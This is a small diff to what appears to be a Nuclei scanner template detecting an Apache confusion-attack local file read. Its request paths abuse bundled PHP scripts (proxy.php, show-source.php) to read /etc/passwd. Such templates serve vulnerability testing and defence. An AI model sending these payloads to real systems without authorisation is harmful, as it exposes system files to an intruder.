@@ -8,7 +8,6 @@ info:
   reference: https://blog.orange.tw/2024/08/confusion-attacks-en.html
   tags: apache,lfr
 
-requests:
 http:
   - method: GET
     path:
@@ -16,7 +15,7 @@ http:
       - "{{BaseURL}}/usr/share/javascript/jquery-jfeed/proxy.php%3furl=/etc/passwd&ooo"
       - "{{BaseURL}}/html/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php%3ftarget=/etc/passwd&ooo"
       - "{{BaseURL}}/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php%3ftarget=/etc/passwd&ooo"
-
+      
     matchers:
       - type: regex
         regex:
